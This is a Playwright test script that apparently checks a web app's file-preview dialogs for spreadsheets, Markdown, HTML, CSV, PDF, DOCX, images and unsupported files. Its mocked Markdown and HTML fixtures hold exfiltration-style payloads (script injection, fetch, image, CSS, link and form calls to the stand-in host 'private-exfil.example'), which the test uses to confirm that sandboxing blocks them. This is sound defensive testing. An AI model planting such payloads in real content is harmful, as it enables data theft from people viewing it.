import assert from "node:assert/strict";
import { chromium } from "playwright";
import { existsSync } from "node:fs";

const browser = await chromium.launch({
  executablePath:
    process.env.CHROMIUM_EXECUTABLE_PATH ||
    (existsSync("/usr/bin/chromium") ? "/usr/bin/chromium" : undefined),
  headless: true,
  args: ["--no-sandbox"],
});
const baseUrl = process.env.FAMSUN_TEST_BASE_URL || "http://127.0.0.1:5173";
const now = new Date().toISOString();
const files = [
  [
    "book",
    "销售分析.xlsx",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  ],
  ["md", "研究报告.md", "text/markdown"],
  ["html", "交付页面.html", "text/html"],
  ["csv", "数据.csv", "text/csv"],
  ["pdf", "实施手册.pdf", "application/pdf"],
  ["image", "图表.png", "image/png"],
  ["large", "大型日志.txt", "text/plain"],
  [
    "doc",
    "项目方案.docx",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  ],
  ["unsupported", "归档.zip", "application/zip"],
].map(([id, name, mime_type]) => ({
  id,
  name,
  mime_type,
  session_id: "s1",
  size: id === "large" ? 3 * 1024 * 1024 : 1024,
  kind: "output",
  created_at: now,
  url: `/api/files/${id}/content`,
}));
let remoteRequests = 0;
const remoteUrls = [];
let failedRequests = 0;
const context = await browser.newContext({
  viewport: { width: 1440, height: 960 },
});
const page = await context.newPage();
await page.addInitScript(() => {
  const originalCreate = URL.createObjectURL.bind(URL);
  const originalRevoke = URL.revokeObjectURL.bind(URL);
  window.previewBlobUrls = new Set();
  URL.createObjectURL = (blob) => {
    const url = originalCreate(blob);
    window.previewBlobUrls.add(url);
    return url;
  };
  URL.revokeObjectURL = (url) => {
    window.previewBlobUrls.delete(url);
    originalRevoke(url);
  };
});
await page.route("https://private-exfil.example/**", (route) => {
  remoteRequests++;
  remoteUrls.push(route.request().url());
  return route.abort();
});
const json = (route, value, status = 200) =>
  route.fulfill({
    status,
    contentType: "application/json",
    body: JSON.stringify(value),
  });
function samplePdf() {
  const stream = (label) => `BT /F1 24 Tf 50 720 Td (${label}) Tj ET`;
  const first = stream("Preview page one");
  const second = stream("Preview page two");
  const objects = [
    "<< /Type /Catalog /Pages 2 0 R >>",
    "<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 6 0 R >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 7 0 R >>",
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    `<< /Length ${first.length} >>\nstream\n${first}\nendstream`,
    `<< /Length ${second.length} >>\nstream\n${second}\nendstream`,
  ];
  let pdf = "%PDF-1.4\n";
  const offsets = [0];
  for (const [index, object] of objects.entries()) {
    offsets.push(pdf.length);
    pdf += `${index + 1} 0 obj\n${object}\nendobj\n`;
  }
  const xref = pdf.length;
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  pdf += offsets
    .slice(1)
    .map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`)
    .join("");
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF`;
  return pdf;
}
await context.route("**/api/**", async (route) => {
  const path = new URL(route.request().url()).pathname;
  if (path === "/api/auth/me")
    return json(route, {
      id: "u1",
      name: "测试用户",
      email: "preview@example.com",
      role: "admin",
    });
  if (path === "/api/settings")
    return json(route, {
      provider: {
        configured: false,
        api_mode: "responses",
        model: "model",
        base_url: "",
      },
      sandbox: { backend: "docker", available: true },
      limits: { max_upload_mb: 25, max_turns: 20 },
      registration_enabled: true,
    });
  if (path === "/api/sessions") return json(route, []);
  if (path === "/api/files") return json(route, files);
  if (path === "/api/files/book/preview")
    return json(route, {
      kind: "spreadsheet",
      sheets: [
        {
          name: "销售汇总",
          rows: [
            ["区域", "销售额"],
            ["华东", 128000],
            ["华南", 96000],
          ],
          total_rows: 3,
          total_columns: 2,
          truncated: false,
        },
        {
          name: "月度明细",
          rows: Array.from({ length: 130 }, (_, i) => [
            `月份 ${i + 1}`,
            i * 100,
          ]),
          total_rows: 2500,
          total_columns: 2,
          truncated: true,
        },
      ],
      truncated: true,
    });
  if (path === "/api/files/doc/preview")
    return json(route, {
      kind: "document",
      paragraphs: ["项目实施方案", "本期完成数据接入与验证。"],
      truncated: false,
    });
  if (path === "/api/files/md/content")
    return route.fulfill({
      contentType: "text/markdown",
      body: "# 研究结论\n\n**收入稳步增长。**\n\n|季度|收入|\n|---|---|\n|Q1|120|\n\n![远程图片](https://private-exfil.example/md)\n\n<script>window.previewAttack = true</script>",
    });
  if (path === "/api/files/html/content")
    return route.fulfill({
      contentType: "text/html",
      body: "<h1>交付页面</h1><script>parent.previewAttack = true; fetch('https://private-exfil.example/script')</script><img src='https://private-exfil.example/image'><style>body{background-image:url(https://private-exfil.example/css)}</style><a href='https://private-exfil.example/link'>恶意链接</a><form action='https://private-exfil.example/form'><button>提交</button></form>",
    });
  if (path === "/api/files/csv/content")
    return route.fulfill({
      contentType: "text/csv",
      body: '\ufeff名称,说明,金额\r\n"华东,一区","第一行\n第二行",123\r\n"引号""测试",正常,456',
    });
  if (path === "/api/files/pdf/content")
    return route.fulfill({ contentType: "application/pdf", body: samplePdf() });
  if (path === "/api/files/image/content")
    return route.fulfill({
      contentType: "image/png",
      body: Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Y9Zl1sAAAAASUVORK5CYII=",
        "base64",
      ),
    });
  failedRequests++;
  return json(route, { detail: "unexpected route" }, 404);
});

async function openFile(name) {
  await page.getByRole("button", { name, exact: true }).click();
  return page.getByRole("dialog", { name });
}
async function closePreview() {
  await page.getByRole("button", { name: "关闭弹窗" }).click();
}
try {
  await page.goto(baseUrl);
  await page.getByRole("button", { name: "文件空间", exact: true }).click();
  const excel = await openFile("销售分析.xlsx");
  await excel.getByRole("tab", { name: "销售汇总" }).waitFor();
  assert.equal(
    await excel
      .getByRole("cell", { name: "128000", exact: true })
      .textContent(),
    "128000",
  );
  await excel.getByRole("tab", { name: "月度明细" }).click();
  await excel.getByText(/已截取/).waitFor();
  await excel.getByRole("button", { name: "下一页数据" }).click();
  await excel.getByRole("cell", { name: "月份 101", exact: true }).waitFor();
  await page.screenshot({
    path: "/tmp/famsun-spreadsheet-preview.png",
    animations: "disabled",
  });
  await page.keyboard.press("Escape");
  assert.equal(await page.getByRole("dialog").count(), 0);
  const md = await openFile("研究报告.md");
  await md.getByRole("heading", { name: "研究结论" }).waitFor();
  assert.equal(await md.locator("strong").textContent(), "收入稳步增长。");
  await md.getByRole("button", { name: "源文件" }).click();
  await md.locator("pre").filter({ hasText: "# 研究结论" }).waitFor();
  await closePreview();
  const html = await openFile("交付页面.html");
  await html.locator("iframe").waitFor();
  await page
    .frameLocator('iframe[title="交付页面.html"]')
    .getByRole("heading", { name: "交付页面" })
    .waitFor();
  await page.waitForTimeout(150);
  assert.equal(remoteRequests, 0, remoteUrls.join(", "));
  assert.equal(await page.evaluate(() => window.previewAttack), undefined);
  assert.equal(await html.locator("iframe").getAttribute("sandbox"), "");
  await closePreview();
  const csv = await openFile("数据.csv");
  await csv.getByRole("cell", { name: "华东,一区", exact: true }).waitFor();
  assert.equal(
    await csv
      .getByRole("cell", { name: '引号"测试', exact: true })
      .textContent(),
    '引号"测试',
  );
  await closePreview();
  const pdf = await openFile("实施手册.pdf");
  await pdf.getByText("1 / 2 页", { exact: true }).waitFor();
  await page.waitForFunction(
    () =>
      document.querySelector(".pdf-canvas-scroll canvas")?.width > 100 &&
      !document.querySelector(".pdf-busy"),
  );
  await pdf.getByRole("button", { name: "下一页 PDF" }).click();
  await pdf.getByText("2 / 2 页", { exact: true }).waitFor();
  await pdf.getByRole("button", { name: "放大 PDF" }).click();
  await pdf
    .getByRole("button", { name: "适合页面宽度" })
    .filter({ hasText: "125%" })
    .waitFor();
  await page.waitForFunction(() => !document.querySelector(".pdf-busy"));
  assert.equal(await pdf.getByRole("alert").count(), 0);
  await page.screenshot({
    path: "/tmp/famsun-pdf-preview.png",
    animations: "disabled",
  });
  await closePreview();
  const doc = await openFile("项目方案.docx");
  await doc.getByText("本期完成数据接入与验证。").waitFor();
  await closePreview();
  const image = await openFile("图表.png");
  await image.getByRole("img", { name: "图表.png" }).waitFor();
  await page.waitForFunction(
    () => document.querySelector(".preview-body img")?.naturalWidth > 0,
  );
  assert.equal(await page.evaluate(() => window.previewBlobUrls.size), 1);
  await closePreview();
  assert.equal(await page.evaluate(() => window.previewBlobUrls.size), 0);
  const large = await openFile("大型日志.txt");
  await large.getByText("文件较大，请下载后查看完整内容。").waitFor();
  await large.getByRole("link", { name: "下载文件" }).waitFor();
  await closePreview();
  const archive = await openFile("归档.zip");
  await archive.getByText("此格式可下载后使用对应应用打开。").waitFor();
  await archive.getByRole("link", { name: "下载文件" }).waitFor();
  await closePreview();
  await page.setViewportSize({ width: 390, height: 844 });
  const mobile = await openFile("销售分析.xlsx");
  await mobile.getByRole("tab", { name: "销售汇总" }).waitFor();
  assert.equal(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  await page.screenshot({
    path: "/tmp/famsun-preview-mobile.png",
    animations: "disabled",
  });
  assert.equal(failedRequests, 0);
  console.log(
    "PASS: Excel sheets/pagination/truncation, Markdown/source, isolated HTML, quoted CSV, PDF pages/zoom, DOCX, image URL cleanup, large-file bound, unsupported download, Escape, mobile overflow",
  );
} catch (error) {
  console.error(
    await page
      .locator(".preview-body")
      .textContent()
      .catch(() => "no preview"),
  );
  throw error;
} finally {
  await browser.close();
}
